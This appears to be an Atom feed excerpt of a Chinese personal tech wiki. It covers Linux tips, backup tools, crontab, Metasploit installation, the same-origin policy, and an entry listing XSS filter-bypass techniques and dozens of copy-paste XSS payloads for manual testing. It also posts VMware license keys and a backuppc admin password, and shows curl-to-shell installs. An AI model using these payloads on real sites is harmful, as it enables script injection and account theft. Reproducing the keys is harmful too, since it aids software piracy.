    <updated>2019-01-30T14:08:03+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15488284836388.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>你永远不知道下一秒会发生什么，所以赶紧珍惜现在吧。</p>
</blockquote>

<h1 id="toc_0">生活习惯篇</h1>

<h2 id="toc_1">多喝热水</h2>

<p>不止&quot;女人是水做的&quot;，男人也是。人体70%是的成分是水。<br/>
多喝水可以减肥、缓解皮肤干燥、排毒除痘、缓解眼睛疲劳等。多喝水还能治疗肾结石。</p>

<h2 id="toc_2">不要久坐</h2>

<p>久坐和喝水少一样危害巨大，因此不可久坐。每坐一个小时就起来走动顺便喝点水吧。</p>

<h2 id="toc_3">给物品定位</h2>

<p>将各类常用物品找一个固定的位置，每次取用后将其放回原处，同时记录每一件物品。掌握自己的生活从掌握自己有多少物品开始。</p>

<h2 id="toc_4">常清洁</h2>

<p>拒绝&quot;仓鼠症&quot;，不要囤积物品。制定房屋打扫计划，经常打扫、整理房间。<br/>
学习&quot;断舍离&quot;</p>

<h2 id="toc_5">注意个人护理</h2>

<p>包括美容养颜、强身健体、预防疾病、个人卫生等。</p>

<h2 id="toc_6">迈开腿管住嘴</h2>

<p>吃饭只吃八分饱，不可贪食吃十分。<br/>
经常出门走走，有利身心健康。看看展馆、游玩山水。工作修炼的是技术、出门修的是身心。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[给网站添加百度、谷歌搜索框]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15487463359475.html"/>
    <updated>2019-01-29T15:18:55+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15487463359475.html</id>
    <content type="html"><![CDATA[
<p>以下是我北斗页面的搜索框代码：</p>

<pre class="line-numbers"><code class="language-markup"> &lt;div style=&#39;overflow:auto&#39;&gt;&lt;form onsubmit=&quot;return baiduWithHttps(this)&quot; action=&quot;http://www.baidu.com/s&quot; target=&quot;_blank&quot;&gt;
        &lt;input class=&#39;bdtext&#39; type=&quot;text&quot;  onfocus=&quot;checkHttps&quot; name=&quot;wd&quot;  size=&quot;30&quot;&gt;&lt;input class=&#39;bdbtn&#39; type=&quot;submit&quot;value=&quot;百度搜索&quot;&gt;
        &lt;/form&gt;&lt;script&gt;function checkHttps () {
                BaiduHttps.useHttps();    
            };
            function baiduWithHttps (formname) {
                var data = BaiduHttps.useHttps();
                if (data.s === 0) {
                    return true;
                }
                else {
                    formname.action = &#39;https://www.baidu.com/s&#39; + &#39;?wd&#39; + data.ssl_code;
                    return true;
                }
            };&lt;/script&gt;&lt;/div&gt;&lt;div style=&#39;overflow:auto&#39;&gt;&lt;form onsubmit=&quot;return googleWithHttps(this)&quot; action=&quot;http://www.google.com/search&quot; target=&quot;_blank&quot;&gt;
    &lt;input class=&#39;bdtext&#39; type=&quot;text&quot;  onfocus=&quot;checkHttps&quot; name=&quot;q&quot;  size=&quot;30&quot;&gt;&lt;input class=&#39;bdbtn&#39; type=&quot;submit&quot;value=&quot;谷歌搜索&quot;&gt;
    &lt;/form&gt;&lt;script&gt;function checkHttps () {
            googleHttps.useHttps();    
        };
        function googleWithHttps (formname) {
            var data = googleHttps.useHttps();
            if (data.s === 0) {
                return true;
            }
            else {
                formname.action = &#39;https://www.google.com/search&#39; + &#39;?q&#39; + data.ssl_code;
                return true;
            }
        };&lt;/script&gt;&lt;/div&gt;
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Snipaste 无法在 Mac 上截图的解决办法]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15484074464554.html"/>
    <updated>2019-01-25T17:10:46+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15484074464554.html</id>
    <content type="html"><![CDATA[
<p>MacOSX 版本：Mojave 10.14.2<br/>
Snipaste 版本：1.16.2</p>

<p>以下列出遇到部分问题：<br/>
1、使用截图功能，手动画矩形框，但是选定框画完后松开触摸板，选定框自动消失，导致无法截图。（手动选定截图区域占截图使用时间99%）<br/>
2、使用截图功能，程序自动识别截图区域，双击可以得到截图并且有箭头等选项，画一个箭头后，选定框自动消失，截图会带着箭头自动保存到图片目录。（这导致没法多画几个箭头，也没法另存为图片）</p>

<h1 id="toc_0">解决办法</h1>

<p>我后来在 <a href="https://github.com/Snipaste/feedback/issues/1012">https://github.com/Snipaste/feedback/issues/1012</a> 这里找到了答案。<br/>
关闭欧路词典的划词翻译功能，即可正常使用截图。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[arch设置屏幕分辨率]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490018.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490018.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p><a href="https://wiki.archlinux.org/index.php/Xrandr_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/index.php/Xrandr_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>

<p>1、先使用xrandr查看屏幕相关信息<br/>
2、编辑/e/X/xorg.conf.d ❯❯❯ sudo nano 11-lonelyorx.conf (自己新建)<br/>
结果我不怎么会写配置文件，导致写了都没法启动图形界面了，于是又删了，打算手动更改。<br/>
3、<br/>
xrandr查看当前设置 <br/>
<code>cvt 1920 1080</code><br/>
<code>cvt 2560 1440</code><br/>
找到正确的参数 <br/>
<code>xrandr --newmode &quot;1920x1080_60.00&quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync</code><br/>
<code>xrandr --newmode &quot;2560x1440_60.00&quot;  312.25  2560 2752 3024 3488  1440 1443 1448 1493 -hsync +vsync</code><br/>
然后设置 <br/>
<code>xrandr --addmode eDP1 1920x1080_60.00</code><br/>
<code>xrandr --addmode HDMI1 2560x1440_60.00</code><br/>
如果一且顺利的话，此时再查看xrandr命令，将发现最佳分辨率设置成功。 <br/>
4、修改分辨率<br/>
<code>xrandr --output eDP1 --mode 1920x1080_60.00</code><br/>
<code>xrandr --output HDMI1 --mode 2560x1440_60.00</code></p>

<p><code>xrandr --newmode &quot;1920x1080_60.00&quot;  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync</code><br/>
<code>xrandr --addmode eDP1 1920x1080_60.00</code><br/>
<code>xrandr --output eDP1 --mode 1920x1080_60.00</code></p>

<p>这样屏幕分辨率就变成1080p了。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[msf安装与维护]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490036.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490036.html</id>
    <content type="html"><![CDATA[
<p><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \<br/>
  chmod 755 msfinstall &amp;&amp; \<br/>
  ./msfinstall</code></p>

<p>上面是官方提供的一键安装脚本</p>

<p>使用msfupdate可以进行更新</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[查看端口占用]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490053.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490053.html</id>
    <content type="html"><![CDATA[
<p>使用命令：<br/>
<code>lsof -i:8000</code><br/>
或<br/>
<code>netstat -tunlp|grep 8000</code><br/>
均可。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[fsarchiver备份文件介绍]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490077.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490077.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>多年以前的笔记</p>
</blockquote>

<p>fsarchiver安装<br/>
<code>apt-get install fsarchiver</code></p>

<pre class="line-numbers"><code class="language-text"># 对于备份操作，我们需要以只读形式重新挂载文件系统或者有条件的话直接卸载。也可以-A忽略
[peter@test88 ~]$ sudo /home/peter/fsarchiver savefs backup.fsa /dev/sdb1
oper_save.c#938,filesystem_mount_partition(): partition [/dev/sdb1] is mounted read/write. please mount it read-only
and then try again. you can do &quot;mount -o remount,ro /dev/sdb1&quot;. you can
also run fsarchiver with option &#39;-A&#39; if you know what you are doing.
removed backup.fsa
 
# 对于恢复操作，我们必须先卸载文件系统。
[peter@test88 ~]$ sudo /home/peter/fsarchiver restfs backup2.fsa id=0,dest=/dev/sdb2
oper_restore.c#1230,extractar_filesystem_extract(): partition [/dev/sdb2] is mounted on [/home/peter/sder].
cannot restore an archive to a partition which is mounted, unmount it first: umount /home/peter/sder
 
# 创建文件系统备份
# 可以将多个文件系统备份在一个文件中
[peter@test88 ~]$ sudo /home/peter/fsarchiver savefs backup.fsa /dev/sdb1 /dev/sdb2
 
# 恢复文件系统
# id=0表明从归档中提取第一个文件系统的内容
[peter@test88 ~]$ sudo /home/peter/fsarchiver restfs backup.fsa id=0,dest=/dev/sdc1 id=1,dest=/dev/sdc2



# 软件说明文档
====&gt; fsarchiver version 0.8.1 (2017-01-10) - http://www.fsarchiver.org &lt;====           
Distributed under the GPL v2 license (GNU General Public License v2).                   
 * usage: fsarchiver [&lt;options&gt;] &lt;command&gt; &lt;archive&gt; [&lt;dev1&gt; [&lt;dev2&gt; [...]]]            
&lt;commands&gt;                                                                              
 * savefs: save filesystems to an archive file (backup a device to a file)              
 * restfs: restore filesystems from an archive (overwrites the existing data)           
 * savedir: save directories to the archive (similar to a compressed tarball)           
 * restdir: restore data from an archive which is not based on a filesystem             
 * archinfo: show information about an existing archive file and its contents           
 * probe [detailed]: show list of filesystems detected on the disks                     
&lt;options&gt;                                                                               
 -o: overwrite the archive if it already exists instead of failing                      
 -v: verbose mode (can be used several times to increase the level of details)          
 -d: debug mode (can be used several times to increase the level of details)            
 -A: allow to save a filesystem which is mounted in read-write (live backup)            
 -a: allow to save a filesystem when acls and xattrs are not supported                  
 -x: enable support for experimental features (they are disabled by default)            
 -e &lt;pattern&gt;: exclude files and directories that match that pattern                    
 -L &lt;label&gt;: set the label of the archive (comment about the contents)                  
 -z &lt;level&gt;: compression level from 1 (very fast) to 9 (very good) default=3            
 -s &lt;mbsize&gt;: split the archive into several files of &lt;mbsize&gt; megabytes each           
 -j &lt;count&gt;: create more than one (de)compression thread. useful on multi-core cpu      
 -c &lt;password&gt;: encrypt/decrypt data in archive, &quot;-c -&quot; for interactive password        
 -h: show help and information about how to use fsarchiver with examples                
 -V: show program version and exit                                                      
&lt;information&gt;                                                                           
 * Support included for: lzo=yes, lzma=yes                                              
 * Support for ntfs filesystems is unstable: don&#39;t use it for production.               
&lt;examples&gt;                                                                              
 * save only one filesystem (/dev/sda1) to an archive:                                  
   fsarchiver savefs /data/myarchive1.fsa /dev/sda1                                     
 * save two filesystems (/dev/sda1 and /dev/sdb1) to an archive:
   fsarchiver savefs /data/myarchive2.fsa /dev/sda1 /dev/sdb1
 * restore the first filesystem from an archive (first = number 0):
   fsarchiver restfs /data/myarchive2.fsa id=0,dest=/dev/sda1
 * restore the second filesystem from an archive (second = number 1):
   fsarchiver restfs /data/myarchive2.fsa id=1,dest=/dev/sdb1
 * restore two filesystems from an archive (number 0 and 1):
   fsarchiver restfs /data/arch2.fsa id=0,dest=/dev/sda1 id=1,dest=/dev/sdb1
 * restore a filesystem from an archive and convert it to reiserfs:
   fsarchiver restfs /data/myarchive1.fsa id=0,dest=/dev/sda1,mkfs=reiserfs
 * restore a filesystem from an archive and specify extra mkfs options:
   fsarchiver restfs /data/myarchive1.fsa id=0,dest=/dev/sda1,mkfs=ext4,mkfsopt=&quot;-I 256&quot;
 * restore a filesystem from an archive and specify a new label and a new UUID:
   fsarchiver restfs /data/myarchive1.fsa id=0,dest=/dev/sda1,label=root,uuid=5f6e5f4f-dc2a-4dbd-a6ea-9ca997cde75e
 * save the contents of /usr/src/linux to an archive (similar to tar):
   fsarchiver savedir /data/linux-sources.fsa /usr/src/linux
 * save a filesystem (/dev/sda1) to an archive split into volumes of 680MB:
   fsarchiver savefs -s 680 /data/myarchive1.fsa /dev/sda1
 * save a filesystem and exclude all files/dirs called &#39;pagefile.*&#39;:
   fsarchiver savefs /data/myarchive.fsa /dev/sda1 --exclude=&#39;pagefile.*&#39;
 * generic exclude for &#39;share&#39; such as &#39;/usr/share&#39; and &#39;/usr/local/share&#39;:
   fsarchiver savefs /data/myarchive.fsa --exclude=share
 * absolute exclude valid for &#39;/usr/share&#39; but not for &#39;/usr/local/share&#39;:
   fsarchiver savefs /data/myarchive.fsa --exclude=/usr/share
 * save a filesystem (/dev/sda1) to an encrypted archive:
   fsarchiver savefs -c mypassword /data/myarchive1.fsa /dev/sda1
 * same as before but prompt for password in the terminal:
   fsarchiver savefs -c - /data/myarchive1.fsa /dev/sda1
 * extract an archive made of simple files to /tmp/extract:
   fsarchiver restdir /data/linux-sources.fsa /tmp/extract
 * show information about an archive and its filesystems:
   fsarchiver archinfo /data/myarchive2.fsa
   ```
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[fluxgui安装与卸载]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490098.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490098.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>很久以前的笔记了</p>
</blockquote>

<pre class="line-numbers"><code class="language-text">Ubuntu/Debian Manual Install
# Install dependencies
sudo apt-get install git python-appindicator python-xdg python-pexpect python-gconf python-gtk2 python-glade2 libxxf86vm1

# Download fluxgui
cd /tmp
git clone &quot;https://github.com/xflux-gui/fluxgui.git&quot;
cd fluxgui
python download-xflux.py

# EITHER install globally
sudo python setup.py install
# EXCLUSIVE OR, install in your home directory. The binary installs
# into ~/.local/bin, so be sure to add that to your PATH if installing locally.
python setup.py install --user

# Run flux
fluxgui
Ubuntu/Debian Manual Uninstall
If you manually installed instead of using the PPA, you can uninstall by making setup.py tell you where it installed files and then removing the installed files.

# EITHER uninstall globally
sudo python setup.py install --record installed.txt
sudo xargs rm -vr &lt; installed.txt

# EXCLUSIVE OR uinstall in your home directory
python setup.py install --user --record installed.txt
xargs rm -vr &lt; installed.txt
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[backup系统备份工具介绍]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490117.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490117.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>backup是一款强大的备份软件，用于系统备份、增量备份、远程备份，企业级。<br/>
我还是当年使用debian时用过...这是以前的笔记，留一份在这好了。</p>
</blockquote>

<p>软件安装（debian 9）<br/>
<code>apt-get install backuppc</code><br/>
然后会弹窗：<br/>
backuppc设定<br/>
管理web地址：<br/>
<code>http://lonelyor/backuppc</code><br/>
<code>user：backuppc</code><br/>
<code>passwd：u6oN2KE1</code><br/>
可以通过运行<code>htpasswd /etc/backuppc/htpasswd</code>来修改密码<br/>
这些信息要记住！</p>

<p>安装后：<br/>
<code>Creating config file /etc/backuppc/config.pl with new version（可以暂时忽略）</code></p>

<p>然后运行：<br/>
<code>systemctl restart apache2</code><br/>
<code>/etc/init.d/backuppc restart</code></p>

<p>接着就打开浏览器访问：<br/>
<code>http://lonelyor/backuppc</code><br/>
就能看到web管理界面了。<br/>
如果进不去可以打开隐身模式或者清除cookie再试。</p>

<p>官方安装文档：<code>http://backuppc.sourceforge.net/BackupPC-4.1.3.html#Installing-BackupPC</code></p>

<p>参考文档：<br/>
<code>http://server.zol.com.cn/513/5130348.html</code></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[VMware14秘钥]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490138.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490138.html</id>
    <content type="html"><![CDATA[
<p>CG54H-D8D0H-H8DHY-C6X7X-N2KG6<br/>
ZC3WK-AFXEK-488JP-A7MQX-XL8YF<br/>
AC5XK-0ZD4H-088HP-9NQZV-ZG2R4<br/>
ZC5XK-A6E0M-080XQ-04ZZG-YF08D<br/>
ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8<br/>
FF590-2DX83-M81LZ-XDM7E-MKUT4</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[v2ray使用方法]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490159.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490159.html</id>
    <content type="html"><![CDATA[
<p>编辑 /etc/v2ray/config.json 文件来配置你需要的代理方式；</p>

<p>运行 service v2ray start 来启动 V2Ray 进程；<br/>
之后可以使用 service v2ray start|stop|status|reload|restart|force-reload 控制 V2Ray 的运行。</p>

<p>v2ray官网：<br/>
<a href="https://www.v2ray.com/chapter_00/install.html">https://www.v2ray.com/chapter_00/install.html</a><br/>
v2ray一键安装：<br/>
bash &lt;(curl -L -s <a href="https://install.direct/go.sh">https://install.direct/go.sh</a>)</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[nano常见设置，如语法高亮、启用行号、启用鼠标等]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490178.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490178.html</id>
    <content type="html"><![CDATA[
<p>下载nano<br/>
linux根据包管理不同，使用不通的命令。<br/>
macosx使用brew安装。</p>

<p>编辑（没有就创建）配置文件<br/>
nano ～/.nanorc<br/>
然后添加以下内容</p>

<pre class="line-numbers"><code class="language-text"># 语法高亮
include &quot;/usr/share/nano/*.nanorc&quot;
</code></pre>

<p>或者</p>

<pre class="line-numbers"><code class="language-text"># 语法高亮
include &quot;/usr/local/share/nano/*.nanorc&quot;
</code></pre>

<p>这里include哪一个主要取决于nanorc的具体位置。通常linux在share，macosx在local/share。<br/>
其他内容如：</p>

<pre class="line-numbers"><code class="language-text"># 启用行号
set linenumbers
# 平滑滚动
set smooth
# 自动缩进
set autoindent
# tab为空格
set tabstospaces
# 启用鼠标
set mouse
</code></pre>

<p>然后保存，重新打开终端，即可发现设置生效，以上方法适用于linux和macosx。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[crontab设置定时任务]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490241.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490241.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>文章参考自：<a href="http://blog.csdn.net/xiaochuige/article/details/49252741">http://blog.csdn.net/xiaochuige/article/details/49252741</a> 感谢作者。</p>
</blockquote>

<p>crontab的基本格式：</p>

<pre class="line-numbers"><code class="language-text">* * * * * command
几个星号分别为：分 时 日 月 周，最后是要执行的命令。
分：0~59
时：0~23
日：1~31
月：1~12
周：0～6（0表示星期天）
除了数字还有几个个特殊的符号就是* / - ：
* 代表所有的取值范围内的数字
/ 代表每的意思
*/5 表示每5个单位
- 代表从某个数字到某个数字
, 分开几个离散的数字
</code></pre>

<p>配置文件的一些例子：</p>

<pre class="line-numbers"><code class="language-text">0 3 * * * /root/test.sh 每天凌晨3点执行test.sh文件
* 23-7/1 * * * /root/lnmp restart 晚上11点到早上7点之间，每隔一小时重启lnmp套件
*/30 * * * * /usr/sbin/ntpdate 每半小时同步一下时间
0 23 * * 6 /lnmp restart 每星期六的11 : 00 pm重启重启lnmp套件。
*/1 * * * * echo &quot;i am running.&quot;&gt;&gt;/tmp/running.txt 每隔1分钟向/tmp/running.txt写一个&quot;i am running.&quot;字符串。
</code></pre>

<p>运行<br/>
我以为编辑crontab保存后会自动执行，其实不然，必须通过重启cron才可以，命令如下：<br/>
启动/etc/init.d/cron start<br/>
关闭/etc/init.d/cron stop<br/>
重启/etc/init.d/cron restart</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xss常用payload]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490298.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490298.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
</blockquote>

<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>

<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>

<p>1.大小写混合绕过<br/>
顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>

<p>2.闭合标签绕过</p>

<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>

<p>3.HEX编码来绕过</p>

<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>

<p>4.Javascript URL</p>

<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>

<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>

<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>

<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>

<p>===&gt;常用代码如下：</p>

<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>

<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>

<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>

<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>

<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>

<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>

<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>

<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>

<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>

<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>

<p><code>&lt;a onclick=alert(4)&gt;h</code></p>

<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>

<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>

<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>

<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>

<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>

<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>

<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>

<p><code>&lt;body/onload=alert(12)&gt;</code></p>

<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>

<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>

<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>

<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>

<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>

<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>

<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>

<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Markdown基础语法]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490336.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490336.html</id>
    <content type="html"><![CDATA[
<p>占坑，内容以后写</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[同源策略]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15483045490355.html"/>
    <updated>2019-01-24T12:35:49+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15483045490355.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>摘自网络，出处忘了。</p>
</blockquote>

<p>同源策略（SOP，Same Origin Policy），两个页面的【协议】【域名】【端口】都相同，则两个页面具有相同的源，任何一个不同都是不同源的。<br/>
举例：<br/>
假设源是：<code>http://store.company.com/dir/page.html</code><br/>
同源的是：<br/>
<code>http://store.company.com/dir2/other.html</code><br/>
<code>http://store.company.com/dir/inner/another.html</code><br/>
不同源的是：<br/>
<code>https://store.company.com/secure.html</code> 不同协议 ( https和http )<br/>
<code>http://store.company.com:81/dir/etc.html</code> 不同端口 ( 81和80)<br/>
<code>http://news.company.com/dir/other.html</code> 不同域名 ( news和store )</p>

<h2 id="toc_0">同源策略控制内容</h2>

<p><em>同源策略是禁止读取HTTP回复，并不会禁止脚本执行，也不会禁止HTTP请求，因此在防御CSRF上作用是非常有限的，因为CSRF在请求发出的时候就已经达到了攻击的目的。</em><br/>
一般情况下，静态资源通常不受同源策略限制，如有js/css/jpg/png等。</p>

<p>同源策略控制了不同源之间的交互，例如在使用<code>XMLHttpRequest</code>或<code>img</code>标签时则会受到同源策略的约束，这些交互通常分为三类。</p>

<ul>
<li>通常允许跨域写（Cross-origin writes），例如链接（links），重定向以及表单提交。少数特定的HTTP请求需要添加&quot;预检请求&quot;<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests">preflight</a>如OPTIONS来查询可用的方法。</li>
<li>通常允许跨域资源嵌入（Cross-origin embedding）</li>
<li>通常 <strong>不允许</strong> 跨域读（Cross-origin reads），但常可以通过内嵌资源来巧妙的进行读取访问。例如可以读取嵌入图片的高度和宽度，调用内嵌脚本的方法，或<a href="https://www.grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">availability of an embedded resource</a></li>
</ul>

<p>下面是可能嵌入跨域资源的示例：<br/>
<code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code> 标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<br/>
<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code> 标签嵌入CSS。由于CSS的<a href="http://scarybeastsecurity.blogspot.dk/2009/12/generic-cross-browser-cross-domain.html">松散的语法规则</a>，CSS的跨域需要一个设置正确的Content-Type 消息头。不同浏览器有不同的限制： <a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622939(v=vs.85)">IE</a>, <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2010-46/">Firefox</a>, <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=9877">Chrome</a>, <a href="https://support.apple.com/zh-cn/HT4070">Safari</a> (跳至CVE-2010-0051)部分 和 <a href="https://security.opera.com/">Opera</a>。<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img"><code>&lt;img&gt;</code></a>嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>&lt;video&gt;</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio"><code>&lt;audio&gt;</code></a>嵌入多媒体资源。<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object"><code>&lt;object&gt;</code></a>, <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed"><code>&lt;embed&gt;</code></a> 和 <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"><code>&lt;applet&gt;</code></a> 的插件。<br/>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@font-face">@font-face</a> 引入的字体。一些浏览器允许跨域字体（ cross-origin fonts），一些需要同源字体（same-origin fonts）。<br/>
